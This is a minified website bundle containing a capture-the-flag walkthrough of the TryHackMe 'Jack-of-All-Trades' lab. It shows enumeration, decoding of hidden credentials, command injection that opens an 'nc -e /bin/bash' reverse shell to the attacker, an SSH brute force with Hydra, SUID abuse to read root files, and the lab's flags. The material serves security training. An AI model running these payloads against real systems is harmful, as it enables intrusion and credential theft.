"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[2163],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>h});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var i=a.createContext({}),c=function(e){var t=a.useContext(i),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},p=function(e){var t=c(e.components);return a.createElement(i.Provider,{value:t},e.children)},d="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},m=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,i=e.parentName,p=l(e,["components","mdxType","originalType","parentName"]),d=c(n),m=r,h=d["".concat(i,".").concat(m)]||d[m]||u[m]||o;return n?a.createElement(h,s(s({ref:t},p),{},{components:n})):a.createElement(h,s({ref:t},p))}));function h(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,s=new Array(o);s[0]=m;var l={};for(var i in t)hasOwnProperty.call(t,i)&&(l[i]=t[i]);l.originalType=e,l[d]="string"==typeof e?e:r,s[1]=l;for(var c=2;c<o;c++)s[c]=n[c];return a.createElement.apply(null,s)}return a.createElement.apply(null,n)}m.displayName="MDXCreateElement"},34625:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>i,contentTitle:()=>s,default:()=>u,frontMatter:()=>o,metadata:()=>l,toc:()=>c});var a=n(87462),r=(n(67294),n(3905));const o={},s="Jack-of-All-Trades",l={unversionedId:"Tryhackme/Jack-of-All-Trades/Jack-of-All-Trades",id:"Tryhackme/Jack-of-All-Trades/Jack-of-All-Trades",title:"Jack-of-All-Trades",description:"Boot-to-root originally designed for Securi-Tay 2020",source:"@site/writeups/Tryhackme/Jack-of-All-Trades/Jack-of-All-Trades.md",sourceDirName:"Tryhackme/Jack-of-All-Trades",slug:"/Tryhackme/Jack-of-All-Trades/",permalink:"/writeups/Tryhackme/Jack-of-All-Trades/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Jack",permalink:"/writeups/Tryhackme/Jack/"},next:{title:"Jacob the Boss",permalink:"/writeups/Tryhackme/Jacob the Boss/"}},i={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Flags",id:"task-1-flags",level:2}],p={toc:c},d="wrapper";function u(e){let{components:t,...o}=e;return(0,r.kt)(d,(0,a.Z)({},p,o,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"jack-of-all-trades"},"Jack-of-All-Trades"),(0,r.kt)("p",null,"Boot-to-root originally designed for Securi-Tay 2020"),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/jackofalltrades"},"Jack-of-All-Trades")),(0,r.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Web Poking"),(0,r.kt)("li",{parentName:"ul"},"Cryptography",(0,r.kt)("ul",{parentName:"li"},(0,r.kt)("li",{parentName:"ul"},"Base64"),(0,r.kt)("li",{parentName:"ul"},"Base32"),(0,r.kt)("li",{parentName:"ul"},"Hex"),(0,r.kt)("li",{parentName:"ul"},"ROT13"))),(0,r.kt)("li",{parentName:"ul"},"Steganography"),(0,r.kt)("li",{parentName:"ul"},"Code Injection (RCE)"),(0,r.kt)("li",{parentName:"ul"},"Brute Forcing SSH"),(0,r.kt)("li",{parentName:"ul"},"Abusing SUID/GUID")),(0,r.kt)("hr",null),(0,r.kt)("h2",{id:"task-1-flags"},"Task 1 Flags"),(0,r.kt)("p",null,"Jack is a man of a great many talents. The zoo has employed him to capture the penguins due to his years of penguin-wrangling experience, but all is not as it seems... We must stop him! Can you see through his facade of a forgetful old toymaker and bring this lunatic down?"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Jack-of-All-Trades$ sudo nmap -A -sS -sC -sV -O 10.10.148.108\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 14:23 CEST\nNmap scan report for 10.10.148.108\nHost is up (0.045s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  http    Apache httpd 2.4.10 ((Debian))\n|_http-server-header: Apache/2.4.10 (Debian)\n|_http-title: Jack-of-all-trades!\n|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)\n80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)\n| ssh-hostkey:\n|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)\n|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)\n|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)\n|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/14%OT=22%CT=1%CU=43743%PV=Y%DS=2%DC=T%G=Y%TM=5F86ED\nOS:F3%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)SE\nOS:Q(SP=105%GCD=1%ISR=10E%TI=Z%II=I%TS=8)OPS(O1=M508ST11NW7%O2=M508ST11NW7%\nOS:O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2\nOS:=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNS\nOS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%\nOS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%\nOS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%\nOS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%\nOS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 1720/tcp)\nHOP RTT      ADDRESS\n1   36.04 ms 10.8.0.1\n2   36.52 ms 10.10.148.108\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 58.50 seconds\n")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"view-source:http://10.10.148.108:22/"},"view-source:http://10.10.148.108:22/")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'<html>\n    <head>\n        <title>Jack-of-all-trades!</title>\n        <link href="assets/style.css" rel=stylesheet type=text/css>\n    </head>\n    <body>\n        <img id="header" src="assets/header.jpg" width=100%>\n        <h1>Welcome to Jack-of-all-trades!</h1>\n        <main>\n            <p>My name is Jack. I\'m a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children\'s toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I\'ll see if I can help you out.</p>\n            <p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that\'s all behind me. I\'m invested in other pursuits now!</p>\n            <p>Please bear with me; I\'m old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don\'t worry, I <em>always</em> clear up after myself.</p>\n            <p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>\n            <img src="assets/stego.jpg">\n            <p>I make a lot of models myself, but I also do toys, like this one:</p>\n            <img src="assets/jackinthebox.jpg">\n            \x3c!--Note to self - If I ever get locked out I can get back in at /recovery.php! --\x3e\n            \x3c!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== --\x3e\n            <p>I hope you choose to employ me. I love making new friends!</p>\n            <p>Hope to see you soon!</p>\n            <p id="signature">Jack</p>\n        </main>\n    </body>\n</html>\n')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Jack-of-All-Trades$ echo "UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVu Y29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==" | base64 -d\n\nRemember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Jack-of-All-Trades$ steghide extract -sf header.jpg\nEnter passphrase:\nwrote extracted data to "cms.creds".\nkali@kali:~/CTFs/tryhackme/Jack-of-All-Trades$ cat cms.creds\nHere you go Jack. Good thing you thought ahead!\n\nUsername: jackinthebox\nPassword: TplFxiSHjY\n')),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"view-source:http://10.10.148.108:22/recovery.php"},"view-source:http://10.10.148.108:22/recovery.php")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'<!DOCTYPE html>\n<html>\n    <head>\n        <title>Recovery Page</title>\n        <style>\n            body{\n                text-align: center;\n            }\n        </style>\n    </head>\n    <body>\n        <h1>Hello Jack! Did you forget your machine password again?..</h1>\n        <form action="/recovery.php" method="POST">\n            <label>Username:</label><br>\n            <input name="user" type="text"><br>\n            <label>Password:</label><br>\n            <input name="pass" type="password"><br>\n            <input type="submit" value="Submit">\n        </form>\n        \x3c!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  --\x3e\n\n    </body>\n</html>\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"echo \"GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=\" | base32 -d | xxd -r -p | tr 'A-Za-z' 'N-ZA-Mn-za-m'\n\nRemember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S\n")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://10.10.148.108:22/nnxhweOV/index.php"},"http://10.10.148.108:22/nnxhweOV/index.php")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"?cmd=nc%20-e%20/bin/bash%2010.8.106.222%2080%209001")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Jack-of-All-Trades$ nc -nlvp 9001\nlistening on [any] 9001 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.148.108] 53706\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\ncd /home\nls\njack\njacks_password_list\ncat jacks_password_list\n*hclqAzj+2GC+=0K\neN<A@n^zI?FE$I5,\nX<(@zo2XrEN)#MGC\n,,aE1K,nW3Os,afb\nITMJpGGIqg1jn?>@\n0HguX{,fgXPE;8yF\nsjRUb4*@pz<*ZITu\n[8V7o^gl(Gjt5[WB\nyTq0jI$d}Ka<T}PD\nSc.[[2pL<>e)vC4}\n9;}#q*,A4wd{<X.T\nM41nrFt#PcV=(3%p\nGZx.t)H$&awU;SO<\n.MVettz]a;&Z;cAC\n2fh%i9Pr5YiYIf51\nTDF@mdEd3ZQ(]hBO\nv]XBmwAk8vk5t3EF\n9iYZeZGQGG9&W4d1\n8TIFce;KjrBWTAY^\nSeUAwt7EB#fY&+yt\nn.FZvJ.x9sYe5s5d\n8lN{)g32PG,1?[pM\nz@e1PmlmQ%k5sDz@\now5APF>6r,y4krSo\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Jack-of-All-Trades$ hydra -l jack -P jacks_password_list -s 80 10.10.148.108 ssh\nHydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-14 14:36:49\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task\n[DATA] attacking ssh://10.10.148.108:80/\n[80][ssh] host: 10.10.148.108   login: jack   password: ITMJpGGIqg1jn?>@\n1 of 1 target successfully completed, 1 valid password found\n[WARNING] Writing restore file because 3 final worker threads did not complete until end.\n[ERROR] 3 targets did not resolve or could not be connected\n[ERROR] 0 targets did not complete\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-14 14:36:52\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"jack:ITMJpGGIqg1jn?>@")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'jack@jack-of-all-trades:~$ ls -la\ntotal 312\ndrwxr-x--- 3 jack jack   4096 Feb 29  2020 .\ndrwxr-xr-x 3 root root   4096 Feb 29  2020 ..\nlrwxrwxrwx 1 root root      9 Feb 29  2020 .bash_history -> /dev/null\n-rw-r--r-- 1 jack jack    220 Feb 29  2020 .bash_logout\n-rw-r--r-- 1 jack jack   3515 Feb 29  2020 .bashrc\ndrwx------ 2 jack jack   4096 Feb 29  2020 .gnupg\n-rw-r--r-- 1 jack jack    675 Feb 29  2020 .profile\n-rwxr-x--- 1 jack jack 293302 Feb 28  2020 user.jpg\njack@jack-of-all-trades:~$ python -m SimpleHTTPServer\nServing HTTP on 0.0.0.0 port 8000 ...\n10.8.106.222 - - [14/Oct/2020 13:40:55] "GET /user.jpg HTTP/1.1" 200 -\n')),(0,r.kt)("p",null,(0,r.kt)("img",{src:n(64347).Z,width:"2480",height:"1902"})),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"jack@jack-of-all-trades:~$ sudo -l\n[sudo] password for jack:\nSorry, user jack may not run sudo on jack-of-all-trades.\njack@jack-of-all-trades:~$ find / -type f -user root -perm -u=s 2>/dev/null\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/pt_chown\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/strings\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/procmail\n/usr/sbin/exim4\n/bin/mount\n/bin/umount\n/bin/su\njack@jack-of-all-trades:~$ strings /root/root.txt\nToDo:\n1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?\n2.Make T-Rex model!\n3.Meet up with Johny for a pint or two\n4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?\n5.Remember to finish that contract for Lisa.\n6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}\n")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"User Flag")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"Root Flag")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}")))}u.isMDXComponent=!0},64347:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/user-0259ea0cc0c61f1f79ae5c748a5074b8.jpg"}}]);